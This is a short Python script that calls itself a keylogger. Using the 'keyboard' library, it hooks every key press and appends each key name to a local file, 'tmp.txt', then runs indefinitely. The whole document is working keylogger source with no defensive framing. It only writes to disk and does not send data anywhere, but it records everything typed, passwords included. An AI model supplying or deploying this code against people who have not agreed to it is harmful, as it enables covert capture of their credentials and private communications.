import keyboard
def keylogger(event):
    """
    callback function called each time a key is pressed
    :param event:
    :return:
    """
    with open("tmp.txt", 'a') as f:
        f.write(f"{event.name}\n")

#call keylogger everytime a key is pressed
keyboard.on_press(keylogger)
keyboard.wait()